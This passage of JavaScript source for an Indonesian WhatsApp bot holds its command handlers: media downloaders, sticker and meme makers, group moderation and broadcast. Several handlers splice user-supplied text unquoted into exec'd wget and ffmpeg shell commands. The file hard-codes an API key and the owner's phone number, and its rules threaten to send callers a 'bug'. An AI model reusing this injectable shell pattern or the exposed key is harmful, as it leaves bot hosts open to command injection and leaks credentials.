	📂 Title : ${info.videoDetails.title}
	📄 Size : ${FileSize(format[0].contentLength)}
	🆔 ID : ${videoId}
	⏲️ Duration : ${anu.all[0].timestamp}
	📊 Viewers : ${h2k(anu.all[0].views)}
	🌐 Upload At : ${anu.all[0].ago}
	🔖 Author : ${anu.all[0].author.name}
	👤 Channel : ${anu.all[0].author.url}
	🔗 Url : ${anu.all[0].url}
	📝 Description : ${anu.all[0].description}`
	await conn.sendMessage(from, {image: {url: foto}, caption: teks},{quoted: dev})
	downloadMp3(q) 
	  } catch(err){
	setReply(err)
	}
	//limitAdd(senderNumber, user)
	}
	break
		
		
		
	case 'ytmp4':
	 try{
	 if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
	setReply("*Scrapping...*")
	
	if(q.includes("https://youtu.be/")){
	var videoId = q.replace('https://youtu.be/', '')
	} else if(q.includes("https://youtube.com/watch?v=")){
	var videoId = q.split('=')[1]
	} else if(q.includes("https://youtube.com/shorts/")){
	var videoId = q.replace('https://youtube.com/shorts/', '')
	}  else {
	return setReply("Link salah")
	}
	
	 let link =`https://youtube.com/watch?v=${videoId}`
	let anu = await yts(link)
	if(anu.all.length == "0") return setReply("Video tidak di temukan")
	let info = await ytdl.getInfo(link);
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
	
	let teks =`*YOUTUBE VIDEO DOWNLOADER*
	
	📂 Title : ${anu.all[0].title}
	💾 Ext : 360p
	📄 Size : ${FileSize(format.contentLength)}
	🆔 ID : ${videoId}
	⏲️ Duration : ${anu.all[0].timestamp}
	🌎 Viewers : ${h2k(anu.all[0].views)}
	🌐 Upload At : ${anu.all[0].ago}
	🔖 Author : ${anu.all[0].author.name}
	📹 Channel : ${anu.all[0].author.url}
	🔗 Url : ${anu.all[0].url}
	📝 Description : ${anu.all[0].description}`
	await conn.sendMessage(from, {image: {url: anu.all[0].image}, caption: teks},{quoted: dev})
	downloadMp4(q) 
	  } catch(err){
	setReply(`${err}`)
	}
	break
		
	
	case 'loli': case 'milf': case 'husbu': case 'cosplay': case 'wallml':{
	let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
	let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
	let kentir = await getBuffer(wipi)
	let teks = "Nih"                                          
	let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]                            
	conn.sendButImage(from, teks, copyright, kentir, buttons, {quoted: dev})      
	 }
	break  
	
	case 'chat': {
	if (!isOwner) return setReply(mess.only.owner)
	if (!q) return setReply( 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
	if (args[0] === 'mute') {
	conn.chatModify({ mute: 'Infinity' }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'unmute') {
	conn.chatModify({ mute: null }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'archive') {
	conn.chatModify({  archive: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'unarchive') {
	conn.chatModify({ archive: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'read') {
	conn.chatModify({ markRead: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'unread') {
	conn.chatModify({ markRead: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'delete') {
	conn.chatModify({ clear: { message: [{ id: dev.quoted.id, fromMe: true }] } }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (q.startsWith("+") || q.startsWith('08') || q.startsWith('62') ){
	if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
	var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
	var org = q.split("|")[1];
	conn.sendMessage(nomor+'@s.whatsapp.net',{text: org})   
	setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)           
	 }
	 }
	 break
	
	
		
	case 'smeme': {
	if(!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
	var top = q.split('|')[0] ? q.split('|')[0] : ''
	var bottom = q.split('|')[1] ? q.split('|')[1] : ''           
	if (isImage || isQuotedImage) {
	setReply(mess.wait)
	
	try{
	let { Sticker, StickerTypes } = require('wa-sticker-formatter')
	let olalah = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let anuah = await TelegraPh(olalah)
	let media = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
	await makeSticker(media,Sticker, StickerTypes)
	await fs.unlinkSync(olalah)
	
	} catch (err){
	let olalah = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let anuah = await TelegraPh(olalah)
	let ranp = getRandom('.gif')
	let rano = getRandom('.webp')
	let anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
	exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
	if (err) return setReply(`${err}`)
	await conn.sendMessage(from,{sticker: fs.readFileSync(rano)}, {quoted: dev})
	await fs.unlinkSync(rano)
	await fs.unlinkSync(ranp)
	})
	}
	} else {
	setReply('kirim foto dengan caption smeme teks1|teks2\nAtau tag foto dengan teks smeme teks1|teks2')
	}
	}
	break    
	
	
	
	
	
	
	
	
	
	case 'rules':{
	let teks =`
	Syarat dan Ketentuan menggunakan *${fake}*
	
	1. Nama dan nomer user ${fake}
		 akan Kami simpan di dalam 
		 server selama bot aktif
		 
	2. Data akan di hapus ketika bot Offline
		 atau di hapus oleh Owner Bot
	
	3. Kami tidak menyimpan gambar, 
		 video, file, audio, dan dokumen 
		 yang kamu kirim ke ${fake}
		 
	4. Kami tidak akan pernah meminta users 
		 untuk memberikan informasi pribadi
		 
	5. Jika menemukan Bug/Error silahkan 
		 langsung lapor ke Owner atau Developer
		 atau bisa juga memakai fitur _*reportbug*_
		 
	6. Beberapa fitur mungkin ada yang error, 
		 jadi tunggu sampai developer 
		 meperbaiki fitur tersebut
			 
	8. Bot ini sudah di lengkapi dengan
		 fitur _*Auto Report Bug*_ jika terjadi
		 error maka bot akan auto report ke
		 developer, terkecuali error yang
		 menyebabkan bot mati, maka user
		 harus lapor ke developer
		 
	7. Bot ini juga sudah di lengkapi dengan 
		 Fitur Anti Spam jika kamu terdeteksi 
		 melakukan spam, maka Bot tidak
		 akan menanggapi kamu selama 20 detik
		
	9. User dilarang keras menelpon bot!
		 jika melanggar maka kamu akan terkena 
		 banned,block dan dikirim bug
	
	10. Bot tidak akan menanggapi user yang
		   meminta untuk di save nomernya`
	
	let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
						{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]
						
	conn.sendButImage(from, teks, `copyright`, fs.readFileSync('./stik/bot.jpg'), mok, {quoted: dev})             
	}
	break
	  
	
	
	case 'kodebahasa':{
	let LANGUAGES = `
	*╭─❲ KODE BAHASA ❳*
	*│*
	*│▸* af: Afrikaans 
	*│▸* sq: Albanian
	*│▸* ar: Arabic
	*│▸* hy: Armenian
	*│▸* ca: Catalan 
	*│▸* zh: Chinese 
	*│▸* zh-cn: Chinese (Mandarin/China)
	*│▸* zh-tw: Chinese (Mandarin/Taiwan)
	*│▸* zh-yue: Chinese (Cantonese)
	*│▸* hr: Croatian
	*│▸* cs: Czech
	*│▸* da: Danish
	*│▸* nl: Dutch
	*│▸* en: English    
	*│▸* en-au: English (Australia)
	*│▸* en-uk: English (United Kingdom)
	*│▸* en-us: English (United States) 
	*│▸* eo: Esperanto 
	*│▸* fi: Finnish 
	*│▸* fr: French
	*│▸* de: German
	*│▸* el: Greek 
	*│▸* ht: Haitian Creole 
	*│▸* hi: Hindi 
	*│▸* hu: Hungarian 
	*│▸* is: Icelandic 
	*│▸* id: Indonesian 
	*│▸* it: Italian
	*│▸* ja: Japanese
	*│▸* ko: Korean
	*│▸* la: Latin
	*│▸* lv: Latvian
	*│▸* mk: Macedonian
	*│▸* no: Norwegian
	*│▸* pl: Polish
	*│▸* pt: Portuguese
	*│▸* pt-br: Portuguese (Brazil)
	*│▸* ro: Romanian
	*│▸* ru: Russian
	*│▸* sr: Serbian
	*│▸* sk: Slovak
	*│▸* es: Spanish 
	*│▸* es-es: Spanish (Spain)
	*│▸* es-us: Spanish (United States)
	*│▸* sw: Swahili
	*│▸* sv: Swedish
	*│▸* ta: Tamil
	*│▸* th: Thai
	*│▸* tr: Turkish
	*│▸* vi: Vietnamese 
	*│▸* cy: Welsh
	*│*
	*╰────────────⦁*`
	setReply(LANGUAGES)
	}
	break
			   // ghstalk
	
	case  'kbbi':{
	  const KBBI = require('kbbi.js') // import the module
	  if (args.length < 1) return setReply('Apa yang mau dicari um?')
	  let asw = await KBBI.cari(q) // kata kunci = pohon
	  Log(asw)
	  let teks = asw.lema
	  for(let i of asw.arti)(
		teks += i 
	  )
	  setReply('Menurut Kbbi:\n\n'+teks)
	  }
	  break
	
	case 'block':
	if (!isOwner) return onlyOwner()
	if(isGroup){
	
	if(users){
	await conn.updateBlockStatus(users, "block")
	setReply(`Sukses block user`)
	} else {
	setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	}
	} else if(!isGroup){
	if(q){
	var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
	if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
	if(!woke.startsWith("62")) return setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	await conn.updateBlockStatus(woke, "block")
	} else if(!q){
	setReply("Masukan nomer yang ingin di block")
	}
	setReply(`Berhasil Block user ${woke.split("@")[0]}`)
	}
	break
	
	case  'unblock':
	if (!isOwner) return onlyOwner()
	if(isGroup){
	if(users){
	await conn.updateBlockStatus(users, "unblock")
	await setReply(`Sukses unblock user`)
	} else if(!q){
	setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	}
	} else if(!isGroup){
	if(q){
	let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
	if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
	if(!woke.startsWith("62")) return setReply("Silakan re�ply pesan atau tag atau input nomer yang mau di block")
	await conn.updateBlockStatus(woke, "unblock")
	setReply(`Sukses unblock ${woke}`)
	} else if(!q){
	setReply("Masukan nomer yang ingin di unblock")
	}
	
	}
	break
	
	
	case 'igstory': {
	if (!q) return setReply( `*Perintah ini untuk mengunduh postingan instagram story*\n\nContoh:\n${prefix + command} alinursetiawan24`)
	let res = await fetch(`https://megayaa.herokuapp.com/api/igstori?username=${q}`)
	if (!res.ok) return setReply('Error')
	let json = await res.json()
	if (!json.status) return setReply(json)
	await setReplty('Sedang di proses..')
	for (let { url, type } of json.data) {
	await sleep(2000)
	conn.sendMedia (from, url, dev, {caption: "Nih"})      
	}
	}
	break
	case 'console':{
	if (!isOwner) return onlyOwner()
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (Console === true) return setReply('Udah aktif kak')
	Console = true
	let ih =`Tampilan console telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	 if (Console === false) return setReply('Udah off kak')
	Console = false
	let eh =`Mode auto respon telah di matikan`
	setReply(eh)
	}else if (!q) {
	conn.sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
	{buttonId: `${prefix}console on`, buttonText: {displayText: On },type: 1},
	{buttonId: `${prefix}console off`, buttonText: { displayText: Off },type: 1}]);
	 }
	 }
	break
	
	
	case 'weather':{
	if(!args[0]) setReply(" please provide place or location name")
	try{
	let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
	let res = await response
	let name = res.data.name
	let Country = res.data.sys.country
	let Weather= res.data.weather[0].description
	let Temperature = res.data.main.temp + '°C'
	let Minimum_Temperature= res.data.main.temp_min + '°C'
	let Maximum_Temperature= res.data.main.temp_max + '°C'
	let Humidity= res.data.main.humidity + '%'
	let Wind= res.data.wind.speed + 'km/h'
	setReply(`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`)
	}catch(e){
	setReply('Lokasi tidak di temukan, silakan masukan nama negara')
	 }
	 }
	break
	
	
	case 'triggered':
	case 'wasted':
	case 'comrade':
	case 'horny':
	case 'blur':
	case 'pixelate':
	case 'simpcard':
	case 'lolice':
	case 'glass':
	if (isQuotedVideo && dev.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage.fileLength < 10000000 || isQuotedImage || isImage) {
	setReply(mess.wait)
	
	try{
	let { Sticker, StickerTypes } = require('wa-sticker-formatter')
	let olalah = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let anuah = await TelegraPh(olalah)
	let media = `https://some-random-api.ml/canvas/${command}?avatar=${anuah}`
	await makeSticker(media,Sticker, StickerTypes)
	await fs.unlinkSync(olalah)
	
	} catch (err){  
	let owgi = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let anu = await TelegraPh(owgi)
	let ranp = getRandom('.gif')
	let rano = getRandom('.webp')
	let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
	exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
	if (err) return setReply(`${err}`)
	await conn.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: dev})
	await fs.unlinkSync(owgi)
	await fs.unlinkSync(ranp)
	await fs.unlinkSync(rano)
	})
	}
	  
	} else if (isQuotedText) {
	setReply(mess.wait)
	
	try{
	let { Sticker, StickerTypes } = require('wa-sticker-formatter')
	let olalah = await conn.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png') 
	let media = `https://some-random-api.ml/canvas/${command}?avatar=${olalah}`
	await makeSticker(media,Sticker, StickerTypes)
	await fs.unlinkSync(olalah)
	
	} catch (err){  
	console.log(err)
	let oppp = await conn.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
	let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${oppp}`
	let ranp = getRandom('.gif')
	let rano = getRandom('.webp')
	exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
	if (err) return setReply(`${err}`)
	await conn.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: dev})
	await fs.unlinkSync(oppp)
	await fs.unlinkSync(ranp)
	await fs.unlinkSync(rano)
	})
	}
	}  else {
	setReply('Gunakan foto!')
	}
	break 
	
	
	
	case 'yts':
	try {
	if (!q) return setReply('Format salah')
	setReply('Tunggu sebentar')
	let rus = await yts(q)
	let  res = await rus.all.filter(v => v.type == 'video')
	let videoID = res[0].videoId
	
	try{
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
	} catch(err) {
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
	}
	let a = `*Youtube Search 🔎*\n`
	for (let i of res) {
	a += `
	📜 Title : ${i.title}
	📈 Views : ${i.views}
	🌐 Upload : ${i.ago}
	⏱️ Durasi : ${i.timestamp}
	🎥 Channel : ${i.author.name}
	🖇️ Link : ${i.url}\n\n`
	}
	let b = a.trim()
	
	let imag = await getBuffer(res[0].image)
	let mok = [{"buttonId": `${prefix}playmp3 ${res[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
						{"buttonId": `${prefix}playmp4 ${res[0].url}`,"buttonText": {"displayText": `ᴠɪᴅᴇᴏ`},"type": "RESPONSE"}]
	conn.sendButImage(from, b, `Baterai : Not Detec\ncopyright`, imag, mok, {quoted: dev})
	 } catch (e) {
	 console.log(e)
	 setReply(`${e}`)
	}
	break  
	
	  case 'setppbot':
	if (!isOwner) return setReply(mess.only.owner)
	if (isImage || isQuotedImage) {
	if(q == 'full'){
	const media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	const { img } = await generateProfilePicture(media)
	await conn.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})       
	await setReply("Sukses")    
	 } else{
	var media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	var data =  await conn.updateProfilePicture(botNumber, { url: media })
	fs.unlinkSync(media)
	setReply(`Sukses`)
	}
	} else  {
	setReply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
	}
	break
	
	case 'setppgc':{
	if (!isOwner) return setReply(mess.only.owner)
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if (isImage || isQuotedImage) {
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await conn.updateProfilePicture(from, { url: media })
	.then( res => {
	setReply(`Sukses`)
	fs.unlinkSync(media)
	}).catch(() => reply(mess.error.api))
	} else {
	setReply(`Kirim/balas gambar dengan caption ${command}`)
	}
	}
	break
	
	
	case 'bc': 
	if (!isOwner) return onlyOwner()
	if (!q) return reply(`Masukkan isi pesannya`)
    let anu = pendaftar
    let muk = [
    {index: 1, urlButton: {displayText: 'Official Group', url: 'https://chat.whatsapp.com/Br5Ju9LjNH0ITOgKr3uUe2'}},
    {index: 2, callButton: {displayText: 'Call Owner!', phoneNumber: '+62 813-1670-1742'}},
    {index: 3, quickReplyButton: {displayText: 'MENU', id: `${prefix}menu`}},
]
    setReply('sending broadcast to '+ pendaftar.length + ' chats...')
    for (let i of anu) {
    await conn.send5ButLoc(i, q, copyright, fs.readFileSync('./stik/thumb.jpeg'),  muk) 
	}
    setReply('succes send broadcast to '+ pendaftar.length + ' chats')
	break
	case 'tes': {
	if (!isOwner) return onlyOwner()
    let memek =`Udah On Om\nBotnya aktif Selama : ${runtime(process.uptime())}`
    let muk = [
    {index: 1, urlButton: {displayText: 'Official Group', url: 'https://chat.whatsapp.com/Br5Ju9LjNH0ITOgKr3uUe2'}},
    {index: 2, callButton: {displayText: 'Call Owner!', phoneNumber: '+62 813-1670-1742'}},
    {index: 3, quickReplyButton: {displayText: 'MENU', id: `${prefix}menu`}},
]
    await conn.send5ButLoc(from, memek, copyright, fs.readFileSync('./stik/thumb.jpeg'),  muk)
  }
	break
	
	case 'antiasing':{
	if (!isGroup) return setReply('Kusus group')
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isKickarea) return setReply("Sudah aktif!!");
	db.data.chats[from].antiasing = true
	setReply("Sukses mengaktifkan kickarea!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isKickarea) return setReply("Udah off!!");
	db.data.chats[from].antiasing = false
	setReply("Sukses mematikan kickarea!");
	} else if (!q) {
	conn.sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, 
	[{buttonId: `${prefix}kickarea on`, buttonText: { displayText: `on`,},type: 1,},
	{buttonId: `${prefix}kickarea off`, buttonText: { displayText: `off`,}, type: 1}, ]);
	 }
	 }
	break;
						
	
	
	
	case 'antilinkgc':{
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply('hanya bisa di group')
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
	db.data.chats[from].antilinkgc = true
	let ih =`@${m.sender.split('@')[0]} Telah Mengaktikan Fitur antilink group`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntilinkGc) return setReply('Udah mati')
	db.data.chats[from].antilinkgc = false
	let ih =`@${m.sender.split('@')[0]} Telah Menonaktifkan Fitur antilink group`
	setReply(ih)
	}else if (!q) {
	conn.sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
	{buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
	{buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
	 }
	 }
	break;  
	
	
	case 'antilink':{
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isGroup) return setReply('hanya bisa di group')
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntiLink) return setReply('Fitur sudah aktif kak')
	db.data.chats[from].antilink = true
	let ih =`@${m.sender.split('@')[0]} Telah Mengaktikan Fitur antilink`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntiLink) return setReply('Fitur Anti link sudah off')
	db.data.chats[from].antilink = false
	let ih =`@${m.sender.split('@')[0]} Telah Menonaktifkan Fitur antilink`
	setReply(ih)
	} else if (!q) {
	conn.sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
	{buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
	{buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
	}
	}
	break;          
	
	
	
	
	
	case 'banchat':{
	if (!isOwner) return onlyOwner()
	if (!isGroup) return setReply(mess.only.group)
	if (isBanchat) return setReply(`udah di ban`)
	db.data.chats[from].banchat = true
	setReply(`Bot berhasil Ban di group ini`)
	}
	break
	
	case 'unbanchat':
	if (!isOwner) return onlyOwner() 
	try {
	if (!isBanchat) return setReply(`udah di UnBan`)
	db.data.chats[from].banchat = false
	setReply(`Bot telah di Unban di group ini`)
	} catch (err){
	console.log(err)
	setReply(`${err}`)
	}
	break
				
	
	case 'whatanime':{
	const FormData = require('form-data')
	if (isImage || isQuotedImage) {       
	let yoooo = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let bodyForm = new FormData();
	bodyForm.append('image', fs.createReadStream(yoooo)) 
	fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
	.then(async(res) =>{
	if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
	let teks = ''
	if (res.result[0].similarity < 0.92) {
	teks += '*Low similarity. 🤔*\n\n'
	}
	teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
	await conn.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: dev})
	})    .catch((err) => {                   
	setReply(mess.error.api)
	})
	} else if (isSticker || isQuotedSticker ) {
	let yoooo = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.png')
	exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
	fs.unlinkSync(yoooo)
	if (err) return setReply('Gagal :V')   
	let bodyForm = new FormData();
	bodyForm.append('image', fs.createReadStream(ran)) 
	fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
	.then(async(res) =>{
	if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
	let teks = ''
	if (res.result[0].similarity < 0.92) {
	teks += '*Low similarity. 🤔*\n\n'
	}
	teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
	await conn.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: dev})
	fs.unlinkSync(ran)
	})
	.catch((err) => {       
	setReply(mess.error.api)
	 })
	 })
	 } else {
	setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
	}
	}
	break
	
	
	case 'getidgc':
	if(!isGroup) return setReply("Hanya bisa di group")
	setReply(`${from}`)
	break
	
	
	case 'brainly':{
	 const { Brainly } = require("brainly-scraper-v2");
	const brainly = new Brainly("id"); 
	if (!q) setReply( 'Soalnya?')
	let nana =`https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
	let foto = await getBuffer(nana)   
	/*
	try{
	  var res = await brainly.search('id', q)
	} catch (err) {
	var res = await brainly.searchWithMT('id', `${q}`)
	}
	*/
	let res = await brainly.searchWithMT(`${q}`, `id`)
	let teks =`_*BRAINLY*_\n\n`
	
	
	   teks += res.map(({ question, answers }, i) => `
	_*PERTANYAAN KE ${i + 1}*_
	${question.content}${answers.map((v, i) => `
	
	*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
	${v.content}`).join``}`).join(`
	═════════════════
	`)
	 
	 teks +=`\n\n_Thanks for choosing Brainly_`
	 
	let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
						{"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
	conn.sendButImage(from, teks, `© ${fake1}`, foto, mok, {})             
	
	}
	break
	  
	
	
	
	
	
		
	case 'tiktoknowm': 
	case 'tiktok':{   
if (!q) return setReply('Masukkan link nya!')
if (!args[0].includes('tiktok')) return reply(mess.error.Iv)
setReply('Tunggu Sebentar Ya Kak')
await fetchJson(`https://saipulanuar.ga/api/download/tiktok?url=${args[0]}`).then(res => {
setReply(`*TIKTOK DOWNLOADER*\n\n*Author:* ${res.result.username}\n\nVideo sedang dikirim...`)
conn.sendMessage(from, {video: {url: res.result.video}, caption: '.'}, {quoted:dev})
}).catch((err) => reply('Terjadi Kesalahan!'))
}
break
						  
	case 'tiktokmusik':{       
	if (args.length < 1) return setReply('Link?')
	if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
	if(q.startsWith("https://vt.tiktok.com/")){
	var lin = args[0]
	} else if(q.startsWith("https://vm.tiktok.com/")){
	var lin = args[0]
	} else if(q.startsWith("https://www.tiktok.com/")){
	var lin = args[0]
	} else {
	return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
	}
	setReply(mess.wait)
	tiktokdlv2(lin).then( async res => {
	let ep = res.video.no_watermark                    
	let nana = await getBuffer(ep)
	let ran = getRandom('.mp3')
	let ron = getRandom('.mp4')
	fs.writeFileSync(ron, nana)
	exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
	fs.unlinkSync(ron)
	if (err) return setReply(`Err: ${err}`)
	let buffer453 = fs.readFileSync(ran)
	conn.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4'}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	})
	}
	 break
							  
						
						
						
	case 'unblockcmd':
	try{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply("Textnya mana cih")
	if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
	deleteblockcmd(q, listcmdblock)        
	setReply(`Berhasil unblock command 「 *${q}* 」`)
	} catch (err) {
	setReply("Bjirr error, keknya ada yang error")
	}
	break  
				
	case 'blockcmd':
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
	if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
	addblockcmd(q,listcmdblock)         
	setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
	break
	
	
	case 'listblockcmd':{
	let wo = `*「 LIST BLOCK CMD 」*`
	let soso = [];
	for (let i of listcmdblock) {
	soso.push(i.cmd)
	wo += `\n\n•> Command : ${i.cmd}`
	}
	setReply(wo)
	}
	break  
	
	
	case 'infogc': {
	if(!isGroup) return setReply("Hanya bisa di dalam group")
	let _meta = await conn.groupMetadata(from)
	  console.log(_meta)
	let _img = await conn.profilePictureUrl(_meta.id, 'image') 
	let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
	`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
	`Group ID : ${_meta.id}`
	await conn.sendMessage(from,{
	caption,
	image: await getBuffer(_img)
	},
	{ quoted: dev }
	)
	}
	break
	
	case 'info':{
	const si = require('systeminformation');
	let OsInfo = await si.osInfo()
	let System = await si.system()
	let Cpu = await si.cpu()
	let Mem = await si.mem()
	
	let {platform,distro,release,codename,kernel,arch,hostname,fqdn,codepage,logofile} = OsInfo
